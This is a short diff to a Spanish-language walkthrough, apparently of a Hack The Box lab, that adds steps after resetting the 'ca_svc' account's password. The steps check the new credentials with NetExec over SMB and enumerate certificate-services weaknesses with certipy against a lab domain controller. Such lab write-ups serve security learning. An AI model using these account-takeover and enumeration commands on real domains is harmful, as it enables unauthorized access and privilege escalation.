@@ -343,3 +343,14 @@ Seteamos la contraseña
 ```shell
 Set-DomainUserPassword -Identity "ca_svc" -AccountPassword $cred
 ```
+
+Verificamos que se haya realizado el cambio de contraseña
+```shell
+nxc smb sequel.htb -u ca_svc -p 'Password123!!'
+```
+
+Vuscamos la vulnerabilidades del usuario
+```shell
+certipy find -u 'ca_svc@sequel.htb' -p 'Password123!!' -dc-ip 10.129.232.128 -stdout
+```
+
